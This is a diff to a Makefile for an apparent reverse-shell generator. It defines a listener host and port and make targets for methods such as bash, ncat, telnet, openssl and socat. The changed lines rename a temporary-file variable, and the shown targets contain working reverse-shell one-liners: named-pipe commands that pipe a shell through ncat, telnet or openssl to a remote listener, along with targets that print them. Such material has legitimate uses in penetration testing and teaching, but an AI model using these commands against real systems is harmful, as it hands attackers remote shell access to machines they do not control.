@@ -2,7 +2,7 @@ SHELL	:= /bin/bash
 HOST	:= 127.0.0.1
 PORT	:= 4444
 PORT2	:= 4445
-FILE	:= $(or $(file), /tmp/f)
+TMP		:= $(or $(tmp), /tmp/f)
 
 METHODS	:= bash1 bash2 bash3 ksh zsh pwsh ncat1 ncat2 telnet1 telnet2 socket openssl python perlphp ruby irb node jrunscript jjs julia socat
 
@@ -22,10 +22,10 @@ show:
 	@printf "HOST: $(GREEN)$(HOST)$(RESET)\n"
 	@printf "PORT: $(GREEN)$(PORT)$(RESET)\n"
 	@printf "SECOND PORT*: $(GREEN)$(PORT2)$(RESET)\n"
-	@printf "TEMPORARY FILE*: $(GREEN)$(FILE)$(RESET)\n"
+	@printf "TEMPORARY FILE/DIR*: $(GREEN)$(TMP)$(RESET)\n"
 	@printf "* = only necessary for some methods\n"
 	@printf "\n"
-	@printf "To change previous values, run $(UNDERLINE)./configure <shell> <host> <port> [<port2>] [<file>]$(RESET).\n"
+	@printf "To change previous values, run $(UNDERLINE)./configure <shell> <host> <port> <port2>$(RESET).\n"
 	@printf "\n"
 	@printf "Available methods:\n"
 	@$(foreach cmd, $(METHODS), printf "   $(BOLD)$(BLUE)$(cmd)$(RESET)\n";)
@@ -101,10 +101,10 @@ ncat1-show:
 	@printf "ncat -e $(SHELL) $(HOST) $(PORT)\n"
 
 ncat2:
-	mkfifo $(FILE); /bin/bash < $(FILE) 2>&1 | ncat 127.0.0.1 4444 > $(FILE); rm $(FILE)
+	mkfifo $(TMP); /bin/bash < $(TMP) 2>&1 | ncat 127.0.0.1 4444 > $(TMP); rm $(TMP)
 
 ncat2-show:
-	@printf "mkfifo $(FILE); /bin/bash < $(FILE) 2>&1 | ncat 127.0.0.1 4444 > $(FILE); rm $(FILE)\n"
+	@printf "mkfifo $(TMP); /bin/bash < $(TMP) 2>&1 | ncat 127.0.0.1 4444 > $(TMP); rm $(TMP)\n"
 
 ############################################################
 
@@ -117,10 +117,10 @@ telnet1-show:
 	@printf "telnet $(HOST) $(PORT) | $(SHELL) 2>&1 | telnet $(HOST) $(PORT2)\n"
 
 telnet2:
-	mkfifo $(FILE); $(SHELL) < $(FILE) 2>&1 | telnet $(HOST) $(PORT) > $(FILE); rm $(FILE)
+	mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | telnet $(HOST) $(PORT) > $(TMP); rm $(TMP)
 
 telnet2-show:
-	@printf "mkfifo $(FILE); $(SHELL) < $(FILE) 2>&1 | telnet $(HOST) $(PORT) > $(FILE); rm $(FILE)\n"
+	@printf "mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | telnet $(HOST) $(PORT) > $(TMP); rm $(TMP)\n"
 
 ############################################################
 
@@ -137,10 +137,10 @@ socket-show:
 ########################## OPENSSL #########################
 
 openssl:
-	mkfifo $(FILE); $(SHELL) < $(FILE) 2>&1 | openssl s_client -quiet -connect $(HOST):$(PORT) > $(FILE); rm $(FILE)
+	mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | openssl s_client -quiet -connect $(HOST):$(PORT) > $(TMP); rm $(TMP)
 
 openssl-show:
-	@printf "mkfifo $(FILE); $(SHELL) < $(FILE) 2>&1 | openssl s_client -quiet -connect $(HOST):$(PORT) > $(FILE); rm $(FILE)\n"
+	@printf "mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | openssl s_client -quiet -connect $(HOST):$(PORT) > $(TMP); rm $(TMP)\n"
 
 ############################################################
 
